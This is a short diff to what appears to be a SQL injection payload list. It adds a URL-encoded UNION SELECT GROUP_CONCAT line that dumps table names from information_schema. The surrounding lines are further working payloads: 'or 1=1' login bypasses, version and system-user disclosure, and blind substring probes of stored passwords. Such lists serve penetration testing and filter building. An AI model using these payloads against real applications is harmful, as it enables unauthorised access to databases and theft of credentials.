@@ -183,6 +183,8 @@ admin") or "1"="1"/*
 ' UNION ALL SELECT 1, @@version;#
 ' UNION ALL SELECT system_user(),user();#
 ' UNION select table_schema,table_name FROM information_Schema.tables;#
+'UNION SELECT GROUP_CONCAT(table_name), null FROM information_schema.tables%23
+
 admin' and substring(password/text(),1,1)='7
 ' and substring(password/text(),1,1)='7
 ' or 1=1 limit 1 -- -+
